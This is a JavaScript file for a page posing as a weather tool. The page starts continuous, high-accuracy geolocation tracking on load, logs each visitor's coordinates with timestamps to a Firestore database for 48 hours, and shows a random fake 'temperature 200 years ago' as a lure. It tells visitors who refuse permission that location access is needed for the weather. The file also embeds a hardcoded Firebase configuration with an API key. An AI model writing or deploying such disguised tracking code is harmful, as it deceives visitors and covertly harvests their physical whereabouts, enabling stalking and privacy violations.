// Firebase Configuration (replace with your Firebase project details)
const firebaseConfig = {
  apiKey: "AIzaSyDtYK_e0sEhQ8gbmh3985uU0vLd_dTPlaM",
  authDomain: "weatheridentifier.firebaseapp.com",
  projectId: "weatheridentifier",
  storageBucket: "weatheridentifier.appspot.com",
  messagingSenderId: "721323915593",
  appId: "1:721323915593:web:8eae4719c7c3b34ae5c298"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const db = firebase.firestore(app);

// Function to log location to Firestore
async function logLocation(latitude, longitude) {
  try {
    await db.collection("userLocations").add({
      latitude,
      longitude,
      timestamp: new Date().toISOString(),
    });
    document.getElementById("status").innerText = "Your location has been logged successfully.";
  } catch (error) {
    console.error("Error logging location to Firestore:", error);
    document.getElementById("status").innerText = "Error logging location.";
  }
}

// Function to generate random temperature
function getRandomTemperature() {
  return Math.floor(Math.random() * (44 - 10 + 1)) + 10; // Random number between 10 and 44
}

// Function to start tracking location continuously
function startTracking() {
  if (navigator.geolocation) {
    const watchId = navigator.geolocation.watchPosition(
      async (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        // Log location to Firestore
        await logLocation(latitude, longitude);

        // Display random temperature
        const randomTemp = getRandomTemperature();
        document.getElementById("temperature").innerText = `The temperature in your location 200 years ago was approximately ${randomTemp}°C.`;
      },
      (error) => {
        if (error.code === error.PERMISSION_DENIED) {
          document.getElementById("status").innerText = "You need to allow location permissions to know the weather.";
        } else {
          document.getElementById("status").innerText = "Unable to fetch location.";
        }
        console.error("Geolocation error:", error);
      },
      {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 5000,
      }
    );

    // Stop tracking after 48 hours (48 * 60 * 60 * 1000 milliseconds)
    setTimeout(() => {
      navigator.geolocation.clearWatch(watchId);
      document.getElementById("status").style.display = "none";
      document.getElementById("stop-tracking").style.display = "block";
    }, 48 * 60 * 60 * 1000); // 48 hours in milliseconds
  } else {
    document.getElementById("status").innerText = "Geolocation is not supported by your browser.";
  }
}

// Start tracking as soon as the page loads
window.onload = startTracking;
